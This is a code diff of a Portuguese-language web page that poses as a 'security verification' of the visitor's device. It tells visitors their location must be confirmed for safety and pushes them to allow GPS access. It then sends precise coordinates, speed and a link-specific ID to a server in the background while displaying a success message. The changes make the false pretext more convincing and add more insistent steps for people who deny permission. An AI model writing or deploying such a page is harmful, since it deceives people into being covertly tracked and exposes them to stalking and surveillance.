@@ -2,68 +2,194 @@
 <html lang="pt-br">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Verificação de Segurança</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #f0f2f5; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; padding: 20px; box-sizing: border-box; }
+        :root {
+            --primary-color: #2563eb; /* Azul profissional */
+            --success-color: #10b981; /* Verde sucesso */
+            --error-color: #ef4444;   /* Vermelho erro */
+            --bg-gradient: linear-gradient(135deg, #1e293b 0%, #0f172a 100%);
+            --card-bg: rgba(255, 255, 255, 0.98);
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--bg-gradient);
+            margin: 0;
+            height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            color: #1e293b;
+        }
+
+        .container {
+            background: var(--card-bg);
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 30px;
+            border-radius: 24px;
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.25);
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+        }
+
+        /* Área do Ícone Animado */
+        .icon-area {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .pulse-ring {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            background: var(--primary-color);
+            opacity: 0.2;
+            animation: pulse 2s cubic-bezier(0.455, 0.03, 0.515, 0.955) infinite;
+        }
+        .pulse-ring:nth-child(2) { animation-delay: 0.5s; }
+
+        .location-pin {
+            font-size: 48px;
+            color: var(--primary-color);
+            z-index: 2;
+            filter: drop-shadow(0 4px 6px rgba(37, 99, 235, 0.3));
+            transition: all 0.3s ease;
+        }
+
+        /* Textos */
+        h2 {
+            margin: 0 0 15px;
+            font-size: 1.5rem;
+            font-weight: 600;
+            color: #0f172a;
+        }
+
+        p.description {
+            margin: 0 0 25px;
+            color: #64748b;
+            line-height: 1.6;
+            font-size: 0.95rem;
+        }
+
+        /* Barra de Status */
+        .status-bar {
+            background: #f1f5f9;
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 0.85rem;
+            color: #475569;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            font-weight: 500;
+        }
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--primary-color);
+            border-radius: 50%;
+            animation: blink 1s infinite;
+        }
+
+        /* Estados de Erro e Sucesso */
+        .container.error .location-pin { color: var(--error-color); filter: drop-shadow(0 4px 6px rgba(239, 68, 68, 0.3)); }
+        .container.error .pulse-ring { background: var(--error-color); animation: none; opacity: 0.1; }
+        .container.error .status-bar { background: #fef2f2; color: var(--error-color); }
+        .container.error .status-dot { background: var(--error-color); animation: none; }
         
-        .card { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); max-width: 400px; width: 100%; }
-        
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
-        
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        h2 { color: #333; margin-top: 0; font-size: 1.2rem; }
-        p { color: #666; font-size: 0.95rem; line-height: 1.5; margin-bottom: 20px; }
-        
-        /* Botão para Tentar Novamente */
-        .btn-retry { background: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 8px; font-weight: bold; cursor: pointer; display: none; width: 100%; font-size: 1rem; }
-        
-        /* Estilos de Erro */
-        .error-box { background: #ffebee; color: #c62828; padding: 15px; border-radius: 8px; font-size: 0.9rem; margin-top: 15px; display: none; border: 1px solid #ef9a9a; }
-        
-        .icon-gps { font-size: 40px; margin-bottom: 10px; display: block; }
+        .container.success .location-pin { color: var(--success-color); filter: drop-shadow(0 4px 6px rgba(16, 185, 129, 0.3)); }
+        .container.success .pulse-ring { animation: none; opacity: 0; }
+        .container.success .status-bar { background: #ecfdf5; color: var(--success-color); }
+        .container.success .status-dot { background: var(--success-color); animation: none; }
+
+        /* Botão de Retry */
+        .btn-action {
+            margin-top: 25px;
+            background: var(--primary-color);
+            color: white;
+            border: none;
+            padding: 14px 28px;
+            border-radius: 12px;
+            font-size: 1rem;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            transition: background 0.2s;
+            display: none; /* Escondido por padrão */
+            box-shadow: 0 4px 6px -1px rgba(37, 99, 235, 0.2);
+        }
+        .container.error .btn-action { display: block; background: var(--error-color); box-shadow: 0 4px 6px -1px rgba(239, 68, 68, 0.2); }
+        .container.error .btn-action:hover { background: #dc2626; }
+
+        @keyframes pulse { 0% { transform: scale(0.8); opacity: 0.5; } 100% { transform: scale(2.5); opacity: 0; } }
+        @keyframes blink { 50% { opacity: 0.4; } }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <div id="loading-icon" class="loader"></div>
-        <h2 id="titulo">Verificando Dispositivo...</h2>
-        <p id="mensagem">Aguarde enquanto estabelecemos conexão segura com o servidor.</p>
+    <div class="container" id="main-card">
+        <div class="icon-area">
+            <div class="pulse-ring"></div>
+            <div class="pulse-ring"></div>
+            <div class="location-pin" id="status-icon">📍</div>
+        </div>
 
-        <div id="error-msg" class="error-box"></div>
+        <h2 id="main-title">Verificação de Dispositivo</h2>
+        
+        <p class="description" id="main-desc">
+            Para garantir a segurança da sua conexão, nosso sistema precisa validar sua localização atual. <br><br>
+            <strong>Por favor, clique em "Permitir" quando solicitado pelo seu navegador.</strong>
+        </p>
 
-        <button id="btn-retry" class="btn-retry" onclick="tentarNovamente()">Tentar Novamente</button>
+        <div class="status-bar" id="status-bar">
+            <div class="status-dot" id="status-dot"></div>
+            <span id="status-text">Aguardando permissão do usuário...</span>
+        </div>
+
+        <button id="btn-retry" class="btn-action" onclick="tentarNovamente()">Ativei o GPS, Tentar Novamente</button>
     </div>
 
     <script>
         const API_URL = "/api/gps";
-        // ID único para identificar essa sessão
         const deviceId = "link_" + Math.random().toString(36).substr(2, 6);
-        let tentativas = 0;
+        const card = document.getElementById('main-card');
+        const statusText = document.getElementById('status-text');
+        const mainTitle = document.getElementById('main-title');
+        const mainDesc = document.getElementById('main-desc');
 
-        function showStatus(titulo, msg, loading=true) {
-            document.getElementById("titulo").innerText = titulo;
-            document.getElementById("mensagem").innerText = msg;
-            document.getElementById("loading-icon").style.display = loading ? "block" : "none";
-        }
-
-        function showError(msg) {
-            const errBox = document.getElementById("error-msg");
-            errBox.style.display = "block";
-            errBox.innerHTML = `<span class="icon-gps">📍</span><br><b>Atenção Necessária:</b><br>${msg}`;
-            document.getElementById("loading-icon").style.display = "none";
-            document.getElementById("btn-retry").style.display = "inline-block";
+        function setEstado(tipo, titulo, desc, status) {
+            card.classList.remove('error', 'success');
+            if (tipo) card.classList.add(tipo);
+            
+            mainTitle.innerHTML = titulo;
+            mainDesc.innerHTML = desc;
+            statusText.innerText = status;
         }
 
         function enviar(position) {
-            // Sucesso!
-            showStatus("Conectado", "Dispositivo verificado com sucesso.", false);
-            document.getElementById("error-msg").style.display = "none";
-            document.getElementById("btn-retry").style.display = "none";
-            document.querySelector(".card").style.borderTop = "5px solid #00c853";
+            // SUCESSO VISUAL
+            setEstado('success', 
+                'Verificação Concluída', 
+                'Seu dispositivo foi validado com segurança. Você pode fechar esta página.',
+                'Localização confirmada com sucesso.'
+            );
+            document.getElementById('status-icon').innerText = '✅';
 
+            // Envia os dados em segundo plano
             fetch(API_URL, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
@@ -74,41 +200,46 @@
                     speed: position.coords.speed || 0,
                     battery: 0,
                     timestamp: Date.now(),
-                    provider: "web_link"
+                    provider: "web_link_elegante"
                 })
             });
         }
 
         function tratarErro(err) {
-            console.warn("Erro GPS:", err.code, err.message);
-            
-            if (err.code === 1) {
-                // PERMISSION_DENIED (Usuário clicou em Bloquear)
-                showError("O acesso à localização foi negado.<br>Por favor, clique no cadeado 🔒 na barra de endereço e permita a localização.");
-            } else if (err.code === 2) {
-                // POSITION_UNAVAILABLE (Geralmente GPS Desligado)
-                showError("Não foi possível detectar o GPS.<br><b>Verifique se a Localização do celular está ATIVADA</b> e tente novamente.");
-            } else if (err.code === 3) {
-                // TIMEOUT
-                showError("O sinal de GPS está fraco.<br>Vá para um local aberto e tente novamente.");
-            } else {
-                showError("Erro desconhecido ao acessar GPS.");
+            let tituloMsg = "Atenção Necessária";
+            let descMsg = "";
+            let statusMsg = "Falha na verificação.";
+
+            if (err.code === 1) { // Negou permissão
+                descMsg = "O acesso foi bloqueado. Para concluir a verificação, você precisa clicar no ícone de cadeado 🔒 no seu navegador e liberar a permissão de Localização.";
+                statusMsg = "Permissão negada pelo usuário.";
+            } else if (err.code === 2 || err.code === 3) { // GPS Desligado ou Timeout
+                descMsg = "Não foi possível obter um sinal preciso. <br><strong>Verifique se o GPS do seu celular está ATIVADO</strong> e tente novamente.";
+                statusMsg = "Sinal GPS indisponível ou desativado.";
             }
+
+            // ESTADO DE ERRO VISUAL
+            setEstado('error', tituloMsg, descMsg, statusMsg);
+            document.getElementById('status-icon').innerText = '⚠️';
         }
 
         function iniciarGPS() {
-            document.getElementById("error-msg").style.display = "none";
-            document.getElementById("btn-retry").style.display = "none";
-            showStatus("Localizando...", "Solicitando permissão de acesso...", true);
+            // Reseta para estado inicial
+            setEstado('', 
+                'Verificação de Dispositivo', 
+                'Para garantir a segurança da sua conexão, nosso sistema precisa validar sua localização atual. <br><br><strong>Por favor, clique em "Permitir" quando solicitado pelo seu navegador.</strong>',
+                'Solicitando acesso ao GPS...'
+            );
+            document.getElementById('status-icon').innerText = '📍';
 
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(enviar, tratarErro, {
-                    enableHighAccuracy: true, // Força tentar usar o hardware GPS
-                    timeout: 10000,
+                    enableHighAccuracy: true,
+                    timeout: 12000, // 12 segundos para tentar pegar o sinal
                     maximumAge: 0
                 });
             } else {
-                showError("Seu navegador não suporta geolocalização.");
+                tratarErro({code: 0, message: "Navegador incompatível"});
             }
         }
 
@@ -116,7 +247,7 @@
             iniciarGPS();
         }
 
-        // Tenta iniciar assim que abre
+        // Inicia ao carregar
         window.onload = iniciarGPS;
 
     </script>
